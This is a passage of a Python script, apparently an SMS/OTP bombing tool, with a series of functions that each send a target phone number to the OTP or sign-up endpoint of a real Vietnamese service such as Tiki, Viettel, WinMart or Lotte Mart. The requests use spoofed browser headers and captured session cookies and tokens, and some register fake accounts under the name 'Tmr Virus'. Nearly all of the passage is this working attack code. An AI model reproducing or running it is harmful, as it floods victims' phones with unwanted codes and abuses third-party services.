        "appname": "Netscape",
        "vendor": "Google Inc.",
        "platform": "Linux armv81",
        "h": "1612.4062290787697",
        "devicetype": "h5",
        "origin": "https://h5.vivohan.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://h5.vivohan.com/login",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    payload = {
    "phone": sdt_vs,
    "type": 2,
    "timestamp": 1719483862982,
    "referrer": "utm_source=e242",
    "af_prt": "e242",
    "sign": "0f656af82eb1da33221a06d1171db265",
    "appversion": "1.0.0",
    "channel": "1",
    "app_version": "1.0.0",
    "version": "1.0.0",
    "imei": "7a5e23b6e63755bfca7774ce004991d8",
    "uuid": "7a5e23b6e63755bfca7774ce004991d8",
    "pkg_name": "com.qcvivo.vivohanh5"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
def VsTeamHttpRequests10(sdt_vs):
    VirusTeam_Url = 'https://concung.com/ajax.html?sendOtpLogin'
    cookies = {
        "PHPSESSID": "ojm3it8kg64tf6t4nosi31jo99",
        "6f1eb01ca7fb61e4f6882c1dc816f22d": "T%2FEqzjRRd5g%3DiQyjVFpORMA%3DD9t74AxVdUc%3Dnv24LfYacp4%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8hPjWy%2Bvut0%3DE8Mp4wfZz74%3D",
        "__utma": "65249340.1189183030.1719485846.1719485846.1719485846.1",
        "__utmc": "65249340",
        "__utmz": "65249340.1719485846.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)",
        "__utmt": "1",
        "_gcl_au": "1.1.112978840.1719485846",
        "_ga": "GA1.1.1336772277.1719485846",
        "_fbp": "fb.1.1719485847111.659364298774262019",
        "_tt_enable_cookie": "1",
        "_ttp": "VQj2jzolFUM1XfTIfQC5vaPi5zM",
        "__utmb": "65249340.3.10.1719485846",
        "_ga_DFG3FWNPBM": "GS1.1.1719485846.1.1.1719485868.38.0.0",
        "_ga_BBD6001M29": "GS1.1.1719485848.1.1.1719485868.40.0.0",
        "Srv": "cc205|Zn1Fu|Zn1Fm"
    }
    headers = {
        "host": "concung.com",
        "content-length": "211",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://concung.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://concung.com/dang-nhap.html",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    payload = {
    "ajax": "1",
    "classAjax": "AjaxLogin",
    "methodAjax": "sendOtpLogin",
    "customer_phone": sdt_vs,
    "id_customer": "0",
    "statictoken": "e633865a31fa27f35b8499e1a75b0a76",
    "captcha_key": "6b419e1337091c1dd8573538ae678d66",
    "momoapp": "0",
    "back": "khach-hang.html"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests11(sdt_vs):
    VirusTeam_Url = 'https://api.tiki.vn/v2/customers/otp_codes'
    cookies = {
        
    }
    headers = {
        "host": "api.tiki.vn",
        "content-length": "43",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://account.tiki.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://account.tiki.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    payload = {
        "phone_number": sdt_vs,
        "is_sso": True
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests12(sdt_vs):
    VirusTeam_Url = 'https://api-crownx.winmart.vn/iam/api/v1/user/register'
    cookies = {
        
    }
    headers = {
        "host": "api-crownx.winmart.vn",
        "content-length": "114",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "x-api-merchant": "WCM",
        "content-type": "application/json",
        "accept": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://winmart.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://winmart.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    payload = {
        "firstName": "Tmr Virus",
        "phoneNumber": sdt_vs,
        "masanReferralCode": "",
        "dobDate": "2003-09-23",
        "gender": "Male"
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests13(sdt_vs):
    VirusTeam_Url = 'https://kavaycash.com/verification/'
    cookies = {
        "csrftoken": "3LQmupWSSG26B6wUZoayi4GecXDKB6Gs3e1ZjIQl5EkttM9JoDthrHupLZSkqD3h",
        "_gcl_au": "1.1.1668310356.1719541325",
        "_gid": "GA1.2.1750389469.1719541325",
        "_fbp": "fb.1.1719541325338.493563507516092024",
        "sw": "784",
        "sh": "1755",
        "agent": "Mozilla/5.0 (Linux",
        "tel": sdt_vs,
        "app_process": "aqfEKOiYV8hnWWxEkid",
        "_gat_UA-216223731-3": "1",
        "_ga": "GA1.1.672424593.1719541325",
        "_ga_6QZT5J4NW1": "GS1.1.1719540425.1.1.1719541394.16.0.0"
    }
    headers = {
        "host": "kavaycash.com",
        "connection": "keep-alive",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Android\"",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    VirusTeam_PhanHoiTuWeb = requests.get(VirusTeam_Url, headers=headers, cookies=cookies, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests14(sdt_vs):
    VirusTeam_Url = 'https://medicare.vn/api/otp'
    cookies = {
        "_gcl_au": "1.1.1095630110.1719546553",
        "_fbp": "fb.1.1719546558845.512164589940881992",
        "_gid": "GA1.2.1666439498.1719546606",
        "_gat_gtag_UA_257373458_1": "1",
        "XSRF-TOKEN": "eyJpdiI6Ik1GTTdLc0ZicjNnSThnRTV5QU8wOFE9PSIsInZhbHVlIjoia0gxbXpxK0tBcUczTTEySFk3d2dtdDJDYkNmdW1FQ0p5SDRCWS82WjBhSVdnUThYVi9vdXVjZUxIOHZ3WkRGZldyZ3dxaWs1am5sVjVHVHNEeGhZa2NTWE5pTkRGc1g5ak9iNndFUGZTS3B2VUVveFZYMkRRdjVwRENWRVdBT2giLCJtYWMiOiI3OWM1YjAxYThkZGU0ZTcyZDVjNWQzM2M4ODU4ZGFiNDQ5MjhhNmQ1NmMzNjcyMWIzMjQzMGZkMzIzMTE0Y2EzIiwidGFnIjoiIn0%3D",
        "medicare_session": "eyJpdiI6ImZ5S3F4aGhxcWxibGdCWkx6bXIzY3c9PSIsInZhbHVlIjoic0ZXMVIyMnYxajl3QzF2T0IvblRtcFBIbCtXMGY1YTVaNmE4bzkwVGlIaDl6ZGRobm1peGU1NEZUaDBGQXNCTUQrdzVMdExJY1dpeEFGa05FZFVnOE9kcEsrcGIvUEVFWUw5RGZyakNNSGNzUFZZZS92RmMyNXVMTmtLekZXNG4iLCJtYWMiOiJkMmRhNTFlOTE2NzUxZmFiMGZiYzU0MDFiOGMxNzYxOTAxMjY2MzdkMjRjYTc0MWUxMmFkYjBkODhlMWFmYmVmIiwidGFnIjoiIn0%3D",
        "_ga_CEMYNHNKQ2": "GS1.1.1719546555.1.1.1719546609.0.0.0",
        "_ga_8DLTVS911W": "GS1.1.1719546555.1.1.1719546609.0.0.0",
        "_ga_R7XKMTVGEW": "GS1.1.1719546555.1.1.1719546609.6.0.0",
        "_ga": "GA1.2.1581204564.1719546556"
    }
    headers = {
        "host": "medicare.vn",
        "connection": "keep-alive",
        "content-length": "52",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "x-xsrf-token": "eyJpdiI6Ik1GTTdLc0ZicjNnSThnRTV5QU8wOFE9PSIsInZhbHVlIjoia0gxbXpxK0tBcUczTTEySFk3d2dtdDJDYkNmdW1FQ0p5SDRCWS82WjBhSVdnUThYVi9vdXVjZUxIOHZ3WkRGZldyZ3dxaWs1am5sVjVHVHNEeGhZa2NTWE5pTkRGc1g5ak9iNndFUGZTS3B2VUVveFZYMkRRdjVwRENWRVdBT2giLCJtYWMiOiI3OWM1YjAxYThkZGU0ZTcyZDVjNWQzM2M4ODU4ZGFiNDQ5MjhhNmQ1NmMzNjcyMWIzMjQzMGZkMzIzMTE0Y2EzIiwidGFnIjoiIn0=",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://medicare.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://medicare.vn/login",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    payload = {
        "mobile": sdt_vs,
        "mobile_country_prefix": "84"
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests15(sdt_vs):
    VirusTeam_Url = "https://id.viettelpost.vn/Account/SendOTPByPhone"
    payload = {
        "FormVerifyOtpModel.Phone": "",
        "FormVerifyOtpModel.Email": "",
        "FormVerifyOtpModel.Password": "",
        "FormVerifyOtpModel.UserId": "",
        "FormForgotPassword.Email": "",
        "FormForgotPassword.UserId": "",
        "FormForgotPassword.OtpRequestToken": "hQJjQ5MHm%2F%2BXhhl4WE%2Fbgqiz4zCSvnT05qKj6TdLzs8KoYZsamRBy8gm8QhpxICqva9jHMo6V25AHvcBwxd1XKKwAEtKLyQEf4MzKeDh0xcoyQ1uuOGDCU3BIZUVmpbS2xVvglOZJs4srUSPHb%2BJLQs%2F2cchM4ynuRe4ALY%2BAmwisUgC1iCCR3xjlK0AoyQYMSqjO5VGerhDihlhRcFce2lUcDuqaV9l%2FN9ZZVc4%2FyzUrEK%2B4KLqQQjtt6L2z7o2vSdCfb9rfJyl17rKyOC21t20Gx26DjDZfd2JNSV9YWP%2FMrjlUhp1rMkW84LDpnJEVi4RBJSwGk05f%2BNFVf5HVOYL2EMAGG7Y",
        "FormRegister.FullName": "Tmr Virus ",
        "FormRegister.UserName": "",
        "FormRegister.Email": "",
        "FormRegister.Phone": sdt_vs,
        "FormRegister.ConfirmPhone": "False",
        "FormRegister.ConfirmEmail": "False",
        "FormRegister.RequiredPhone": "False",
        "FormRegister.RequiredEmail": "False",
        "FormRegister.Provider": "",
        "FormRegister.ProviderUserId": "",
        "FormRegister.Password": "tmrvirus@080",
        "FormRegister.ConfirmPassword": "tmrvirus@080",
        "FormRegister.IsRegisterFromPhone": "True",
        "FormRegister.UserId": "",
        "FormMergeModel.JsonListEmailConflict": "",
        "FormMergeModel.JsonListPhoneConflict": "",
        "FormMergeModel.EmailSelected": "",
        "FormMergeModel.PhoneSelected": "",
        "FormMergeModel.PhoneVerify": "",
        "FormMergeModel.EmailVerify": "",
        "FormMergeModel.IsRequiredSelect": "False",
        "FormMergeModel.Password": "",
        "FormMergeModel.Provider": "",
        "FormMergeModel.ProviderUserId": "",
        "FormMergeModel.IsEmailVerified": "False",
        "FormMergeModel.IsPhoneVerified": "False",
        "FormNotMergeModel.Password": "",
        "FormNotMergeModel.Provider": "",
        "FormNotMergeModel.ProviderUserId": "",
        "FormNotMergeModel.UserSSOId": "",
        "FormNotMergeModel.EmailSelected": "",
        "FormNotMergeModel.PhoneSelected": "",
        "FormNotMergeModel.NotMergePhoneVerify": "",
        "FormNotMergeModel.NotMergeEmailVerify": "",
        "FormNotMergeModel.IsEmailVerified": "False",
        "FormNotMergeModel.IsPhoneVerified": "False",
        "FormLoginOTP.Username": "",
        "ReturnUrl": "/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=yijz8vlw9sq18ixa2syn",
        "ConfirmOtpType": "Register",
        "UserClientId": "",
        "ClientId": "",
        "OTPCode1": "",
        "OTPCode2": "",
        "OTPCode3": "",
        "OTPCode4": "",
        "OTPCode5": "",
        "OTPCode6": "",
        "__RequestVerificationToken": "CfDJ8ASZJlA33dJMoWx8wnezdv9pHSl62H8ETz8PrrRLh7ei9-cH81rwUjhYma4bcIbyzuKNct_hRvh6Ep5vzL2cBeOhFb4kifVHVcNGj2c5V3WqdrBFBbcwa7lekDQZqEbdP2WxRlNX1Y2nsYgV4XIfVF0"
    }
    headers = {
        "Connection": "keep-alive",
        "Content-Length": "2345",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Android\"",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "null",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    cookies = {
        "_gid": "GA1.2.321715260.1719534988",
        "QUIZIZZ_WS_COOKIE": "id_192.168.12.139_15001",
        "_ga_L7ZKY279LR": "GS1.1.1719547450.1.0.1719547450.0.0.0",
        ".AspNetCore.Antiforgery.XvyenbqPRmk": "CfDJ8ASZJlA33dJMoWx8wnezdv8PDZgS6N9tWl7rl47OVtEtBd7q5uVs209SDGglWMcHRe7VXk13akW9bstLkVCJp61XhrOdWP_J-knU8UkdB4qfsGoJ8aiLLy5mJET8Wv6w7P-Q2JSTQAJnysf31vfNf2s",
        "_ga_9NGCREH08E": "GS1.1.1719547446.2.0.1719547451.55.0.0",
        "_ga_P86KBF64TN": "GS1.1.1719547453.2.1.1719547481.0.0.0",
        "_ga_7RZCEBC0S6": "GS1.1.1719547452.2.1.1719547844.0.0.0",
        "_ga_WN26X24M50": "GS1.1.1719547452.2.1.1719547844.0.0.0",
        "_ga": "GA1.1.1174340557.1719534988"
    }

    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests16(sdt_vs):
    VirusTeam_Url = 'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp'
    cookies = {
        "__Host-next-auth.csrf-token": "5ce831aaf39a45f51023bdb9a1b86295028c6ce931af4141f102da70bfaf6ba1%7C740bffb8a914710bef3618aff60a5155e7e3267f63b6cb50047f85136e248770",
        "__Secure-next-auth.callback-url": "https%3A%2F%2Fwww.lottemart.vn",
        "_gcl_au": "1.1.1949895470.1719553003",
        "_ga": "GA1.1.1795106602.1719553003",
        "_fbp": "fb.1.1719553012751.965723839463688791",
        "_ga_6QLJ7DM4XW": "GS1.1.1719553002.1.1.1719553122.57.0.0"
    }
    headers = {
        "host": "www.lottemart.vn",
        "content-length": "43",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://www.lottemart.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    payload = {
        "username": sdt_vs,
        "case": "register"
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests17(sdt_vs):
    VirusTeam_Url = 'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp'
    cookies = {
        
    }
    headers = {
        "host": "online-gateway.ghn.vn",
        "content-length": "40",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://sso.ghn.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://sso.ghn.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    payload = {
        "phone": sdt_vs,
        "type": "register"
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests18(sdt_vs):
    VirusTeam_Url = 'https://api.onelife.vn/v1/gateway/'
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'authorization': '',
        'content-type': 'application/json',
        'dnt': '1',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    payload = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': sdt_vs,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests19(sdt_vs):
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn',}
    response = requests.get('https://viettel.vn/dang-ky', headers=headers)
    token = response.text.split('name="csrf-token" content="')[1].split('"')[0]
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-XSRF-TOKEN': token,'X-CSRF-TOKEN': token,'X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap',}
    data = {'msisdn': sdt_vs}
    response = requests.post('https://viettel.vn/api/get-otp', json=data, headers=headers)
    result = response.json()
def VsTeamHttpRequests20(sdt_vs):
    cookies = {'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF','__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1','XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',}
    headers = {'Accept': 'application/json, text/plain, */*','Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Type': 'application/json;charset=UTF-8','DNT': '1','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i','X-Requested-With': 'XMLHttpRequest','X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
    json_data = {'phone': sdt_vs,'type': '',}
    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
def VsTeamHttpRequests21(sdt_vs):
    VirusTeam_Url = 'https://products.popsww.com/api/v5/auths/register'
    headers = {
        'authority': 'products.popsww.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'api-key': '5d2300c2c69d24a09cf5b09b',
        'content-type': 'application/json',
        'dnt': '1',
        'lang': 'vi',
        'origin': 'https://pops.vn',
        'platform': 'web',
        'profileid': '657ca7582a4ac90054bcc10a',
        'referer': 'https://pops.vn/auth/signin-signup/signup',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sub-api-version': '1.1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-env': 'production',
    }

    payload = {
        'fullName': '',
        'account': sdt_vs,
        'password': 'tmrvirus@080',
        'confirmPassword': 'tmrvirus@080',
